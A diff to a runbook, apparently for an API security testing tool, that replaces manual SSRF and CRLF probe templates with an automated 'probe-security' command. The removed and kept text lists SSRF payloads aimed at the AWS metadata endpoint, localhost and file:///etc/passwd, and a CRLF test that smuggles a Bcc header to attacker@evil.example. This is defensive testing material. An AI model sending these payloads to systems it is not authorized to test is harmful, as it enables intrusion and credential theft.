@@ -282,14 +282,34 @@ tests:
 If `is_admin: true` survives the round-trip GET → **HIGH**. File via
 `zond report case-study` (Phase 7).
 
-### Phase 5.2 — Manual security probes (SSRF, header-injection)
+### Phase 5.2 — Security probes (SSRF, CRLF, open-redirect)
 
-Until first-class commands ship (TASK-59 SSRF / TASK-60 CRLF), use these
-templates **only on endpoints whose spec matches the trigger** — running blindly
-is noise.
+```bash
+zond probe-security ssrf,crlf --api <name> --env apis/<name>/.env.yaml \
+  --output apis/<name>/probes/security-digest.md \
+  --emit-tests apis/<name>/probes/security
+```
 
-**SSRF — trigger:** POST/PATCH body field named `*url*`, `endpoint`, `webhook`,
-`callback`, `redirect_uri`, `image_url`, or `format: uri | url`.
+`probe-security` autodetects vulnerable fields by name + `format` hint
+(SSRF: `*_url` / `webhook` / `callback` / `redirect_uri` / `format: uri`;
+CRLF: `subject` / `*_prefix` / `name` / `description` / `title`; open-redirect:
+`redirect` / `next` / `return_to`). For each detected (field × payload) it
+sends a **baseline-OK** request first; if baseline ≠ 2xx the endpoint is
+marked `INCONCLUSIVE-BASELINE` and attacks are skipped (no more 5×404
+noise on scope-locked endpoints, see m-8 feedback §F). Verdict per
+finding: HIGH (5xx **or** payload echoed in 2xx body — stored injection
+candidate), LOW (2xx, no echo — verify side-effects manually), OK
+(4xx). Idempotent cleanup via DELETE counterpart, regression YAML via
+`--emit-tests`.
+
+`--dry-run` lists which (endpoint, field) pairs would be attacked
+without sending any requests — useful for sanity-checking field
+detection on a new spec.
+
+When `probe-security` decides a field needs manual triage (e.g., the
+detected field name is unconventional, or you want a custom payload like
+`http://[::1]:80` that isn't in the built-in list), drop down to a hand
+-written YAML probe:
 
 ```yaml
 tests:
@@ -299,32 +319,9 @@ tests:
     expect: { status: [400, 422] }     # NOT 2xx, NOT 5xx
 ```
 
-Payloads to iterate: `http://169.254.169.254/latest/meta-data/` (AWS IMDS),
-`http://127.0.0.1:22`, `http://10.0.0.1` (RFC1918), `http://[::1]`,
-`file:///etc/passwd`, `gopher://`, `dict://`. Triage: `2xx` = accepted internal
-URL; `5xx` = unguarded URL parser; high `duration_ms` on 4xx = server attempted
-the connection (timing side-channel).
-
-**CRLF / header-injection — trigger:** body fields `subject`, `from`, `to`,
-`cc`, `bcc`, `reply_to`, `headers[]`, `tags[].name`, or any free-text serialised
-into outbound mail/HTTP headers.
-
-```yaml
-tests:
-  - name: CRLF in <field>
-    POST: /<endpoint>
-    json:
-      from: "{{verified_from_email}}"
-      to: "{{real_to_email}}"
-      subject: "ok\r\nBcc: attacker@evil.example"
-      html: "<p>x</p>"
-    expect: { status: [400, 422] }
-```
-
-Payload variants: `\r\nBcc: ...`, `\nX-Injected: 1`, `%0d%0aBcc:...` (URL-encoded),
-`\r\n\r\n<html>` (response-splitting). Triage: `2xx` = accepted at API layer
-(filing-worthy even without sink confirmation); `5xx` on `\r\n` = unguarded
-serialiser (separate bug).
+Common bespoke payloads: `http://169.254.169.254/latest/meta-data/`
+(AWS IMDS), `http://10.0.0.1` (RFC1918), `gopher://`, `dict://`. Triage
+remains the same as `probe-security`'s automatic classification.
 
 ### Phase 5.3 — Robustness probes (content-type, idempotency)
 
